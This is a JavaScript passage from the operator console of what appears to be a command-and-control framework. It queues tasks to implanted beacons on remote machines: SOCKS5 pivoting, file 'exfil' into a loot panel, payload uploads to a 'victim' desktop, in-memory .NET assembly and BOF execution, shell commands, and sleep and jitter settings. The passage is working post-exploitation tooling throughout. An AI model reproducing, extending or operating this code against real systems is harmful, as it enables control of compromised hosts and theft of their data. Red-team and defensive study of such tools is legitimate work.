                    appendLine('[error] invalid port — must be 1-65535', 'err');
                    _writePrompt();
                    return;
                }
                body.port = p;
            }
            try {
                const r = await authFetch(tsUrl + '/api/socks', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body),
                });
                if (!r.ok) {
                    const t = await r.text();
                    appendLine('[!] socks5 start failed: ' + t, 'err');
                } else {
                    appendLine('[*] SOCKS5 proxy start requested', 'hint');
                }
            } catch (err) {
                appendLine('[!] socks5 start error: ' + err.message, 'err');
            }
        } else {
            try {
                const r = await authFetch(tsUrl + '/api/socks/' + _actualBid(), { method: 'DELETE' });
                if (!r.ok) {
                    const t = await r.text();
                    appendLine('[!] socks5 stop failed: ' + t, 'err');
                } else {
                    appendLine('[*] SOCKS5 proxy stop requested', 'hint');
                }
            } catch (err) {
                appendLine('[!] socks5 stop error: ' + err.message, 'err');
            }
        }
        _writePrompt();
        return;
    }

    // ---- File transfer builtins ----

    if (baseCmd === 'download') {
        const remotePath = cmd.slice(9).trim();
        if (!remotePath) { appendLine('[error] usage: download <remote_path>', 'err'); _writePrompt(); return; }
        try {
            const resp = await authFetch(tsUrl + '/api/task', {
                method:  'POST',
                headers: { 'Content-Type': 'application/json' },
                body:    JSON.stringify(Object.assign({ beacon_id: _actualBid(), type: 4, code: 0, args: remotePath }, _isSessionTab() ? {} : { transport: 'http' })),
            });
            if (!resp.ok) appendLine('[error] server returned ' + resp.status, 'err');
            else        { try { const rj = await resp.json(); if (rj.label) _tabLabels[rj.label] = beaconId; } catch(_){} appendLine('[+] exfil queued: ' + remotePath, 'hint'); _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1; }
        } catch (e) { appendLine('[error] ' + e.message, 'err'); }
        _writePrompt();
        return;
    }

    if (baseCmd === 'upload') {
        const destPath = cmd.slice(7).trim();
        if (!destPath) { appendLine('[error] usage: upload <remote_path>', 'err'); appendLine('  e.g. upload C:\\Users\\victim\\Desktop\\payload.exe', 'hint'); _writePrompt(); return; }
        let picker = document.getElementById('upload-picker');
        if (!picker) {
            picker = document.createElement('input');
            picker.type  = 'file';
            picker.id    = 'upload-picker';
            picker.style.display = 'none';
            document.body.appendChild(picker);
        }
        picker.onchange = async () => {
            const file = picker.files[0];
            if (!file) return;
            const fd = new FormData();
            fd.append('beacon_id', String(_actualBid()));
            fd.append('dest_path', destPath);
            fd.append('file', file);
            try {
                const r = await authFetch(tsUrl + '/api/upload', { method: 'POST', body: fd });
                if (!r.ok) { appendLine('[error] upload failed: ' + r.status, 'err'); return; }
                const j = await r.json();
                if (j.label) _tabLabels[j.label] = beaconId;
                appendLine('[+] upload queued: ' + j.chunks + ' chunk(s) -> ' + destPath, 'hint');
                _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
            } catch (e) { appendLine('[error] ' + e.message, 'err'); }
            picker.value = '';
        };
        picker.click();
        _writePrompt();
        return;
    }

    if (baseCmd === 'execute-assembly') {
        const parts = cmdArgs.split(/\s+/);
        const nameOrEmpty = parts[0] || '';
        const asmArgs = parts.slice(1).join(' ');

        const doExec = async (fd) => {
            try {
                const r = await authFetch(tsUrl + '/api/exec-assembly', { method: 'POST', body: fd });
                if (!r.ok) { appendLine('[error] exec-assembly failed: ' + (await r.text()), 'err'); _writePrompt(); return; }
                const j = await r.json();
                if (j.label) _tabLabels[j.label] = beaconId;
                appendLine(`[*] assembly queued (label: ${j.label}, shellcode: ${j.sc_size} bytes)`, 'hint');
                _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
            } catch (e) { appendLine('[error] ' + e.message, 'err'); _writePrompt(); }
        };

        if (nameOrEmpty) {
            try {
                const listResp = await authFetch(tsUrl + '/api/assemblies');
                const assemblies = await listResp.json();
                const found = assemblies.find(a => a.name.toLowerCase() === nameOrEmpty.toLowerCase());
                if (found) {
                    const fd = new FormData();
                    fd.append('beacon_id', String(_actualBid()));
                    fd.append('assembly_name', found.name);
                    fd.append('args', asmArgs);
                    fd.append('spawnto', '');
                    await doExec(fd);
                    return;
                }
            } catch (_) {}
        }

        let picker = document.getElementById('asm-picker');
        if (!picker) {
            picker = document.createElement('input');
            picker.type = 'file';
            picker.id = 'asm-picker';
            picker.accept = '.exe,.dll';
            picker.style.display = 'none';
            document.body.appendChild(picker);
        }
        appendLine('[*] select .NET assembly file...', 'hint');
        picker.onchange = async () => {
            const file = picker.files[0];
            if (!file) { _writePrompt(); return; }
            const fd = new FormData();
            fd.append('beacon_id', String(_actualBid()));
            fd.append('assembly', file);
            fd.append('args', cmdArgs);
            fd.append('spawnto', '');
            await doExec(fd);
            picker.value = '';
        };
        picker.click();
        return;
    }

    if (baseCmd === 'inline-assembly') {
        if (_isLinux) {
            appendLine('[error] inline-assembly is Windows-only', 'err');
            _writePrompt();
            return;
        }

        let inlineReq;
        try {
            inlineReq = _parseInlineAssemblyInput(cmd, cmdArgs);
        } catch (e) {
            appendLine('[error] ' + e.message, 'err');
            _writePrompt();
            return;
        }

        const doInlineExec = async (fd) => {
            try {
                const r = await authFetch(tsUrl + '/api/inline-assembly', { method: 'POST', body: fd });
                if (!r.ok) {
                    appendLine('[error] inline-assembly failed: ' + (await r.text()), 'err');
                    _writePrompt();
                    return;
                }
                const j = await r.json();
                if (j.label) _tabLabels[j.label] = beaconId;
                appendLine(`[*] inline-assembly queued (label: ${j.label})`, 'hint');
                _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
            } catch (e) {
                appendLine('[error] ' + e.message, 'err');
                _writePrompt();
            }
        };

        if (inlineReq.assemblyName) {
            try {
                const listResp = await authFetch(tsUrl + '/api/assemblies');
                const assemblies = await listResp.json();
                const found = assemblies.find(a => a.name.toLowerCase() === inlineReq.assemblyName.toLowerCase());
                if (found) {
                    const fd = new FormData();
                    fd.append('beacon_id', String(_actualBid()));
                    fd.append('assembly_name', found.name);
                    fd.append('args', inlineReq.libraryArgs);
                    fd.append('mode', inlineReq.mode);
                    await doInlineExec(fd);
                    return;
                }
            } catch (_) {}
        }

        let picker = document.getElementById('inline-asm-picker');
        if (!picker) {
            picker = document.createElement('input');
            picker.type = 'file';
            picker.id = 'inline-asm-picker';
            picker.accept = '.exe,.dll';
            picker.style.display = 'none';
            document.body.appendChild(picker);
        }
        appendLine('[*] select .NET assembly file for inline execution...', 'hint');
        picker.onchange = async () => {
            const file = picker.files[0];
            if (!file) { _writePrompt(); return; }
            const fd = new FormData();
            fd.append('beacon_id', String(_actualBid()));
            fd.append('assembly', file);
            fd.append('args', inlineReq.pickerArgs);
            fd.append('mode', inlineReq.mode);
            await doInlineExec(fd);
            picker.value = '';
        };
        picker.click();
        return;
    }

	if (baseCmd === 'bof-execute') {
        if (_isLinux) {
            appendLine('[error] bof-execute is Windows-only', 'err');
            _writePrompt();
            return;
        }

        const parts = cmdArgs.split(/\s+/);
        const nameOrEmpty = parts[0] || '';
        const bofArgs = parts.slice(1).join(' ');
        if (nameOrEmpty && /\.(o|obj)$/i.test(nameOrEmpty)) {
            try {
                await queueBOFObjectName(nameOrEmpty, bofArgs);
            } catch (e) {
                appendLine('[error] ' + e.message, 'err');
            }
            _writePrompt();
            return;
        }

        openBOFPicker(cmdArgs, true);
        return;
    }

    if (baseCmd === 'bof-upload') {
        const name = cmdArgs.trim();
        if (!/\.(o|obj)$/i.test(name)) {
            appendLine('[error] usage: bof-upload <name.o|name.obj>', 'err');
            _writePrompt();
            return;
        }
        let picker = document.getElementById('bof-upload-picker');
        if (!picker) {
            picker = document.createElement('input');
            picker.type = 'file';
            picker.id = 'bof-upload-picker';
            picker.accept = '.o,.obj';
            picker.style.display = 'none';
            document.body.appendChild(picker);
        }
        appendLine('[*] select BOF object to upload as "' + name + '"...', 'hint');
        picker.onchange = async () => {
            const file = picker.files[0];
            if (!file) { _writePrompt(); return; }
            try {
                await uploadBOFObjectFile(name, file);
            } catch (e) {
                appendLine('[error] ' + e.message, 'err');
            }
            picker.value = '';
            _writePrompt();
        };
        picker.click();
        return;
    }

    if (typeof BUILTIN_BOF_COMMANDS !== 'undefined' && BUILTIN_BOF_COMMANDS.includes(baseCmd)) {
        if (_isLinux) {
            appendLine('[error] ' + baseCmd + ' is Windows-only', 'err');
            _writePrompt();
            return;
        }
        try {
            await queueBOFObjectName(baseCmd, cmdArgs);
        } catch (e) {
            appendLine('[error] ' + e.message, 'err');
        }
        _writePrompt();
        return;
    }

    if (baseCmd === 'assembly-upload') {
        const name = cmdArgs.trim();
        if (!name) { appendLine('[error] usage: assembly-upload <name>', 'err'); _writePrompt(); return; }
        let picker = document.getElementById('asm-upload-picker');
        if (!picker) {
            picker = document.createElement('input');
            picker.type = 'file';
            picker.id = 'asm-upload-picker';
            picker.accept = '.exe,.dll';
            picker.style.display = 'none';
            document.body.appendChild(picker);
        }
        appendLine('[*] select .NET assembly to upload as "' + name + '"...', 'hint');
        picker.onchange = async () => {
            const file = picker.files[0];
            if (!file) { _writePrompt(); return; }
            const fd = new FormData();
            fd.append('name', name);
            fd.append('assembly', file);
            try {
                const r = await authFetch(tsUrl + '/api/assemblies', { method: 'POST', body: fd });
                if (!r.ok) { appendLine('[error] upload failed: ' + r.status, 'err'); _writePrompt(); return; }
                const j = await r.json();
                appendLine(`[+] assembly "${j.name}" uploaded (${j.size} bytes)`, 'hint');
            } catch (e) { appendLine('[error] ' + e.message, 'err'); }
            picker.value = '';
            _writePrompt();
        };
        picker.click();
        return;
    }

    if (baseCmd === 'assembly-list') {
        try {
            const r = await authFetch(tsUrl + '/api/assemblies');
            const list = await r.json();
            if (list.length === 0) {
                appendLine('(no assemblies in library)', 'hint');
            } else {
                appendLine('Assemblies:', 'info');
                for (const a of list) {
                    appendLine(`  ${a.name}  (${a.size} bytes)`, 'info');
                }
            }
        } catch (e) { appendLine('[error] ' + e.message, 'err'); }
        _writePrompt();
        return;
    }

    if (baseCmd === 'bof-list') {
        try {
            const r = await authFetch(tsUrl + '/api/library');
            if (!r.ok) {
                appendLine('[error] bof-list failed: ' + (await r.text()), 'err');
                _writePrompt();
                return;
            }
            const files = await r.json();
            const bofs = (Array.isArray(files) ? files : []).filter(f => String(f.kind || '').toLowerCase() === 'bof');
            const operatorBofs = bofs.filter(f => String(f.source || '').toLowerCase() !== 'builtin');
            const builtinBofs = bofs.filter(f => String(f.source || '').toLowerCase() === 'builtin');
            const sizeText = (f) => (typeof formatBytes === 'function') ? formatBytes(f.size || 0) : ((f.size || 0) + ' bytes');
            const printGroup = (title, list) => {
                if (!list.length) return;
                appendLine(title + ':', 'info');
                for (const f of list.sort((a, b) => String(a.name || '').localeCompare(String(b.name || '')))) {
                    const file = f.file && f.file !== f.name ? `  [${f.file}]` : '';
                    appendLine(`  ${f.name}${file}  (${sizeText(f)})`, 'info');
                }
            };

            if (!bofs.length) {
                appendLine('(no BOFs in library)', 'hint');
            } else {
                printGroup('Operator BOFs', operatorBofs);
                printGroup('Built-in BOFs', builtinBofs);
            }
        } catch (e) { appendLine('[error] ' + e.message, 'err'); }
        _writePrompt();
        return;
    }

    if (baseCmd === 'assembly-delete') {
        const name = cmdArgs.trim();
        if (!name) { appendLine('[error] usage: assembly-delete <name>', 'err'); _writePrompt(); return; }
        try {
            const r = await authFetch(tsUrl + '/api/assemblies/' + encodeURIComponent(name), { method: 'DELETE' });
            if (r.status === 204) {
                appendLine(`[+] assembly "${name}" deleted`, 'hint');
            } else {
                appendLine('[error] delete failed: ' + r.status, 'err');
            }
        } catch (e) { appendLine('[error] ' + e.message, 'err'); }
        _writePrompt();
        return;
    }

    // ---- Generic task dispatch ----

    let taskType = 12; // TaskRun
    let taskCode = 0;  // CodeRunShell
    let taskArgs = cmd;

    if (baseCmd === 'sleep') {
        const sleepParts = cmd.substring(5).trim().split(/\s+/);
        const sec = parseInt(sleepParts[0], 10);
        const jit = sleepParts.length > 1 ? parseInt(sleepParts[1], 10) : 0;
        if (isNaN(sec) || sec < 0 || (sleepParts.length > 1 && (isNaN(jit) || jit < 0 || jit > 100))) {
            appendLine('[error] usage: sleep <seconds> [jitter%]', 'err');
            appendLine('  e.g. sleep 5 20', 'hint');
            _writePrompt(); return;
        }
        taskType = 2; // TaskSet
        taskCode = 0; // CodeSetSleep
        taskArgs = sec + (sleepParts.length > 1 ? ' ' + jit : '');
    } else if (baseCmd === 'exit') {
        taskType = 1; // TaskExit
        taskCode = 0; // CodeExitNormal
        taskArgs = '';
    }

    try {
        const _tb = { beacon_id: _actualBid(), type: taskType, code: taskCode, args: taskArgs };
        if (!_isSessionTab()) _tb.transport = 'http';
        const resp = await authFetch(tsUrl + '/api/task', {
            method:  'POST',
            headers: { 'Content-Type': 'application/json' },
            body:    JSON.stringify(_tb),
        });
        if (!resp.ok) {
            appendLine('[error] server returned ' + resp.status + (resp.status === 404 ? ' (Beacon may not exist anymore)' : ''), 'err');
        } else {
            try { const rj = await resp.json(); if (rj.label) _tabLabels[rj.label] = beaconId; } catch(_){}
            if (!_isSessionTab()) {
                appendLine('[+] task queued', 'hint');
                _pendingTasks[beaconId] = (_pendingTasks[beaconId] || 0) + 1;
            }
        }
    } catch (e) {
        appendLine('[error] ' + e.message, 'err');
    }
    if (!_isSessionTab()) _writePrompt();
}

// ---- Xterm init ----

function _initXterm(containerId) {
    const el = document.getElementById(containerId);
    if (!el || _term || typeof Terminal === 'undefined') {
        console.error('[bebop] _initXterm failed:', !el ? 'no element' : _term ? 'already init' : 'Terminal undefined');
        return;
    }

    const term = new Terminal({
        fontFamily:        "'JetBrains Mono', 'IBM Plex Mono', 'Cascadia Mono', 'Courier New', monospace",
        fontSize:          13,
        letterSpacing:     0.5,
        lineHeight:        1.4,
        cursorBlink:       true,
        cursorStyle:       'block',
        scrollback:        5000,
        scrollSensitivity: 3,
        allowTransparency: true,
        theme: {
            background:          '#000000',
            foreground:          '#d4d4d4',
            cursor:              '#ffb000',
            cursorAccent:        '#000000',
            selectionBackground: 'rgba(255,176,0,0.25)',
            black:   '#000000', red:     '#c84b31',
            green:   '#4a90a4', yellow:  '#ffb000',
            blue:    '#4a90a4', magenta: '#c84b31',
            cyan:    '#4a90a4', white:   '#e8d5a3',
            brightBlack:   '#1e2d3d', brightRed:     '#c84b31',
            brightGreen:   '#4a90a4', brightYellow:  '#ffb000',
            brightBlue:    '#4a90a4', brightMagenta: '#c84b31',
            brightCyan:    '#4a90a4', brightWhite:   '#ffffff',
        },
    });

    const fit = new FitAddon.FitAddon();
    term.loadAddon(fit);
    term.open(el);
    try { fit.fit(); } catch (_) {}

    _term     = term;
    _fitAddon = fit;

    new ResizeObserver(() => { try { fit.fit(); } catch (_) {} }).observe(el);
    term.onData(_handleData);
}

let _termFullscreen = false;

function openFullscreenTerminal() {
    _termFullscreen = !_termFullscreen;
    document.body.classList.toggle('terminal-fullscreen', _termFullscreen);
    setTimeout(() => {
        if (_fitAddon) try { _fitAddon.fit(); } catch (_) {}
        if (_shellFit) try { _shellFit.fit(); } catch (_) {}
        if (_term) _term.scrollToBottom();
        if (_shellTerm) _shellTerm.scrollToBottom();
    }, 50);
}

function termFontSize(delta) {
    if (!_term) return;
    const cur = _term.options.fontSize || 14;
    const next = Math.max(8, Math.min(28, cur + delta));
    _term.options.fontSize = next;
    if (_fitAddon) try { _fitAddon.fit(); } catch (_) {}
    // Also resize shell xterm if it exists
    if (_shellTerm) {
        _shellTerm.options.fontSize = next;
        if (_shellFit) try { _shellFit.fit(); } catch (_) {}
    }
}

// ---- Poll results ----

async function pollResults() {
    const tsUrl = getTsUrl();
    if (!tsUrl || beaconId === null || isNaN(_actualBid())) return;
    if (_isSessionTab()) return;
    try {
        const sr = await authFetch(tsUrl + '/api/sessions');
        if (sr.ok) {
            const bs = await sr.json();
            const b = bs.find(x => x.id === _actualBid());
            if (b) {
                _lastSeenPrev = b.last_seen;
            }
        }
    } catch (_) {}
    try {
        const resp = await authFetch(tsUrl + `/api/results/${_actualBid()}?since=${pollSince}`);
        if (!resp.ok) return;
        const results = await resp.json();
        let hasNew = false;
        for (const r of (results || [])) {
            if (r.label && !_tabLabels[r.label]) { if (r.received_at > pollSince) pollSince = r.received_at; continue; }
            if (r.label && _tabLabels[r.label] !== beaconId) { if (r.received_at > pollSince) pollSince = r.received_at; continue; }
            if (r.type === 3) {
                appendLine('[+] ' + (r.output || 'upload complete'), 'output');
            } else if (r.type === 4) {
                appendLine('[+] exfil complete: ' + (r.filename || '?'), 'output');
                appendLine('    check the LOOT tab to download or delete', 'hint');
                loadLootPanel();
            } else if (r.type === 2) {
                appendLine('[+] ' + (r.output || 'config updated'), 'hint');
                loadSessions();
            } else if (_isInlineAssemblyResult(r)) {
                appendLine(_formatInlineAssemblyOutput(r), 'output');
            } else {
                appendLine(r.output || '', 'output');
            }
            if (r.received_at > pollSince) pollSince = r.received_at;
            hasNew = true;
        }
        if (hasNew && _term) _term.scrollToBottom();
    } catch (_) {}
}

// ---- Tabbed terminal management ----

const _openTabs = new Map();
const _activeShells = new Set();
const _tabLabels = {};

function _renderTabs() {
    const bar = document.getElementById('terminal-tabs');
    if (!bar) return;
    bar.innerHTML = '';
    const _svgClose = '<svg width="10" height="10" viewBox="0 0 10 10" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><line x1="2" y1="2" x2="8" y2="8"/><line x1="8" y1="2" x2="2" y2="8"/></svg>';
    for (const [id, tab] of _openTabs) {
        const isShell = typeof id === 'string' && id.startsWith('shell_');
        const isSess  = typeof id === 'string' && id.startsWith('sess_');
        const isFb    = _isFbTab(id);
        const el = document.createElement('div');
        el.className = 'terminal-tab' + (id === beaconId ? ' active' : '') + (isFb ? ' fb-tab' : '');
        if (isShell) {
            const hostname = escapeHtml(tab.hostname || '?');
            el.innerHTML =
                '<span class="terminal-tab-name" style="color:#AFA9EC"><span style="opacity:0.6;margin-right:5px">$_</span>' + hostname + '</span>' +
                '<span class="terminal-tab-close" data-id="' + id + '">' + _svgClose + '</span>';
        } else if (isSess) {
            const hostname = escapeHtml(tab.hostname || '?');
            el.innerHTML =
                '<span class="terminal-tab-name" style="color:#AFA9EC"><span style="opacity:0.6;margin-right:5px">$_</span>' + hostname + '</span>' +
                '<span class="terminal-tab-close" data-id="' + id + '">' + _svgClose + '</span>';
        } else if (isFb) {
            const hostname = escapeHtml(tab.hostname || '?');
            const isFbSess = typeof id === 'string' && id.startsWith('fbs_');
            const prefix = isFbSess ? '<span style="opacity:0.6;margin-right:5px">$_</span>' : '';
            el.innerHTML =
                '<span class="terminal-tab-name" style="color:var(--amber)">' + prefix + hostname + ' — FILE BROWSER</span>' +
                '<span class="terminal-tab-close" data-id="' + id + '">' + _svgClose + '</span>';
        } else {
            el.innerHTML =
                '<span class="terminal-tab-name">' + escapeHtml(tab.hostname || '?') + '</span>' +
                '<span class="terminal-tab-close" data-id="' + id + '">' + _svgClose + '</span>';
        }
        el.addEventListener('click', (e) => {
            if (e.target.classList.contains('terminal-tab-close')) return;
            _switchTab(id);
        });
        el.querySelector('.terminal-tab-close').addEventListener('click', (e) => {
            e.stopPropagation();
            _closeTab(id);
        });
        bar.appendChild(el);
    }
}

async function _switchTab(id) {
    if (id === beaconId) return;
    const oldId = beaconId;
    const oldIsShell = typeof oldId === 'string' && oldId.startsWith('shell_');
    const oldIsFb = _isFbTab(oldId);
    const newIsShell = typeof id === 'string' && id.startsWith('shell_');
    const newIsFb = _isFbTab(id);

    // Save current tab state
    if (!oldIsShell && !oldIsFb) {
        _saveBeaconState(oldId);
    }
    if (sessionWs) { sessionWs.close(); sessionWs = null; }

    // Keep shell WebSocket alive when switching tabs — shell runs in background

    beaconId = id;

    // Hide ALL panels first
    const termEl = document.getElementById('terminal');
    const shellEl = document.getElementById('shell-terminal');
    const fbSwitchEl = document.getElementById('file-browser');
    if (termEl) termEl.style.display = 'none';
    if (shellEl) shellEl.style.display = 'none';
    if (fbSwitchEl) fbSwitchEl.style.display = 'none';

    if (newIsFb) {
        // Switching TO a file browser tab
        if (fbSwitchEl) fbSwitchEl.style.display = 'flex';
        const bid = _fbTabBid(id);
        const isSession = typeof id === 'string' && id.startsWith('fbs_');
        const state = _fbGetState(bid, id, isSession);
        const renderFileBrowser = function() {
            if (!state.tree[state.root]) {
                state.expanded.add(state.root);
                _fbSendTask(bid, state.root, isSession);
            }
            _fbRender(bid, id);
        };
        if (typeof _fbRestoreFromServer === 'function') {
            _fbRestoreFromServer(bid, id, isSession).finally(renderFileBrowser);
        } else {
            renderFileBrowser();
        }
    } else if (newIsShell) {
        // Switching TO a shell tab
        const tab = _openTabs.get(id);
        _activeShellBid = tab ? tab.shellBid : null;

        if (!_shellTerm) _initShellXterm();
        if (shellEl) shellEl.style.display = '';

        const entry = _shellWsMap.get(_activeShellBid);
        if (!entry || !entry.ws || entry.ws.readyState !== WebSocket.OPEN) {
            _shellTerm.clear();
            _shellTerm.write('\x1b[2J\x1b[H');
            _shellTerm.write('\x1b[33mReconnecting shell...\x1b[0m\r\n');
            _connectShellWs(_activeShellBid);
        } else if (entry.buffer.length > 0) {
            for (const chunk of entry.buffer) _shellTerm.write(chunk);
            entry.buffer = [];
        }

        if (_shellTerm) { _shellTerm.scrollToBottom(); _shellTerm.focus(); }
        try { _shellFit.fit(); } catch(_) {}
    } else {
        // Switching TO a beacon/session tab
        const isSessTab = typeof id === 'string' && id.startsWith('sess_');
        const numId = isSessTab ? parseInt(id.slice(5), 10) : id;

        if (termEl) termEl.style.display = '';
        if (!_term) _initXterm('terminal');

        if (_term) {
            _term.clear();
            _term.write('\x1b[2J\x1b[H');
            _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
            _outputLog = [];
        }

        if (!_restoreBeaconState(id)) {
            if (!isSessTab) {
                const serverState = await _loadTerminalFromServer(numId);
                if (serverState && serverState.outputLog.length > 0) {
                    _beaconStates[id] = serverState;
                    _restoreBeaconState(id);
                    pollSince = serverState.pollSince || 0;
                }
            } else {
                pollSince = Math.floor(Date.now() / 1000) - 1;
            }
        }

        if (!_promptVisible) _writePrompt();

        pollResults();

        if (isSessTab) connectSessionWs(numId);

        setTimeout(() => { if (_term) { _term.scrollToBottom(); _term.focus(); } }, 10);
        if (_fitAddon) try { _fitAddon.fit(); } catch(_) {}
    }

    _renderTabs();
    _saveTabs();
}

function _closeTab(id) {
    const isShell = typeof id === 'string' && id.startsWith('shell_');
    const isFb = _isFbTab(id);

    // Close shell WebSocket but keep shell process alive on beacon
    if (isShell) {
        const tab = _openTabs.get(id);
        const bid = tab ? tab.shellBid : null;
        if (bid) {
            const entry = _shellWsMap.get(bid);
            if (entry && entry.ws) entry.ws.close();
            _shellWsMap.delete(bid);
        }
        _activeShellBid = null;
    }

    // Hide file browser if closing fb_ tab
    if (isFb) {
        const fbEl = document.getElementById('file-browser');
        if (fbEl) fbEl.style.display = 'none';
    }

    _openTabs.delete(id);

    if (id === beaconId) {
        if (sessionWs) { sessionWs.close(); sessionWs = null; }
        beaconId = null;

        // Hide all panels
        const shellEl = document.getElementById('shell-terminal');
        const termEl = document.getElementById('terminal');
        const fbCloseEl = document.getElementById('file-browser');
        if (shellEl) shellEl.style.display = 'none';
        if (fbCloseEl) fbCloseEl.style.display = 'none';
        if (termEl) termEl.style.display = '';

        if (_openTabs.size > 0) {
            const nextId = _openTabs.keys().next().value;
            _renderTabs();
            _switchTab(nextId);
        } else {
            document.body.classList.remove('panel-open');
            if (_term) {
                _term.clear();
                _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
                _outputLog = [];
            }
            _renderTabs();
        }
    } else {
        _renderTabs();
    }
    _saveTabs();
}

async function openTerminal(id) {
    const isSession = typeof id === 'string' && id.startsWith('sess_');
    const actualId = isSession ? parseInt(id.slice(5), 10) : id;

    if (!_term) _initXterm('terminal');

    if (_openTabs.has(id)) {
        _switchTab(id);
        document.body.classList.add('panel-open');
        _saveTabs();
        return;
    }

    // If coming from a shell or file browser tab, swap visibility
    const oldIsShell = typeof beaconId === 'string' && beaconId.startsWith('shell_');
    const oldIsFb = _isFbTab(beaconId);
    if (oldIsShell || oldIsFb) {
        const shellEl = document.getElementById('shell-terminal');
        const termEl = document.getElementById('terminal');
        const fbEl = document.getElementById('file-browser');
        if (shellEl) shellEl.style.display = 'none';
        if (fbEl) fbEl.style.display = 'none';
        if (termEl) termEl.style.display = '';
    }

    _saveBeaconState(beaconId);

    beaconId = id;

    if (_term) {
        _term.clear();
        _inputBuf = ''; _cursorPos = 0; _promptVisible = false;
        _outputLog = [];
    }

    document.body.classList.add('panel-open');

    if (!isSession) {
        const serverState = await _loadTerminalFromServer(actualId);
        if (serverState && serverState.outputLog.length > 0) {
            _beaconStates[id] = serverState;
            if (_term) { _term.clear(); _term.write('\x1b[2J\x1b[H'); }
            _promptVisible = false;
            _restoreBeaconState(id);
            pollSince = serverState.pollSince || 0;
        } else {
            if (_term) { _term.clear(); _term.write('\x1b[2J\x1b[H'); }
            _promptVisible = false;
            pollSince = Math.floor(Date.now() / 1000) - 1;
            appendLine('Type "help" to list available commands.', 'hint');
        }
    } else {
        if (_term) { _term.clear(); _term.write('\x1b[2J\x1b[H'); }
        _outputLog = []; _promptVisible = false;
        pollSince = Math.floor(Date.now() / 1000) - 1;
        appendLine('Session terminal — commands routed via TCP (real-time).', 'hint');
        appendLine('Type "help" to list available commands.', 'hint');
        connectSessionWs(actualId);
    }
    if (!_promptVisible) _writePrompt();
    if (_term) { _term.scrollToBottom(); _term.focus(); }

    const _bid = (typeof id === 'string' && id.startsWith('sess_')) ? parseInt(id.slice(5), 10) :
                 (typeof id === 'string' && id.startsWith('shell_')) ? parseInt(id.slice(6), 10) : id;
    const _cached = _beacons && _beacons[_bid];
    _openTabs.set(id, { hostname: (_cached && _cached.hostname) || '?' });
    _fetchTabHostname(id);
    _renderTabs();
    _saveTabs();

    pollResults();
}

function _refreshOpenTabHostnames() {
    if (!_beacons || _openTabs.size === 0) return;
    let changed = false;
    for (const [id, tab] of _openTabs) {
        let actualId;
        if (_isFbTab(id))         actualId = _fbTabBid(id);
        else if (typeof id === 'string' && id.startsWith('sess_'))  actualId = parseInt(id.slice(5), 10);
        else if (typeof id === 'string' && id.startsWith('shell_')) actualId = parseInt(id.slice(6), 10);
        else                                                        actualId = id;
        const b = _beacons[actualId];
        if (b && b.hostname && tab.hostname !== b.hostname) {
            tab.hostname = b.hostname;
            changed = true;
        }
    }
    if (changed) { _renderTabs(); _saveTabs(); }
}

async function _fetchTabHostname(id) {
    const tsUrl = getTsUrl();
    if (!tsUrl) return;
    let actualId;
    if (_isFbTab(id))         actualId = _fbTabBid(id);
    else if (typeof id === 'string' && id.startsWith('sess_'))  actualId = parseInt(id.slice(5), 10);
    else if (typeof id === 'string' && id.startsWith('shell_')) actualId = parseInt(id.slice(6), 10);
    else                                                        actualId = id;
    try {
        const resp = await authFetch(tsUrl + '/api/sessions');
        const beacons = await resp.json();
        const b = beacons.find(x => x.id === actualId);
        if (!b) return;
        const tab = _openTabs.get(id);
        if (tab && b.hostname) {
            tab.hostname = b.hostname;
            _renderTabs();
            _saveTabs();
        }
        _beaconModes[actualId] = b.mode || 'beacon';
        if (b.mode === 'session' && _isSessionTab()) {
            connectSessionWs(actualId);
        }
    } catch (_) {}
}

function closeTerminal() {
    _saveBeaconState(beaconId);
    document.body.classList.remove('panel-open');
    if (sessionWs) { sessionWs.close(); sessionWs = null; }
    beaconId = null;
    _saveTabs();
}
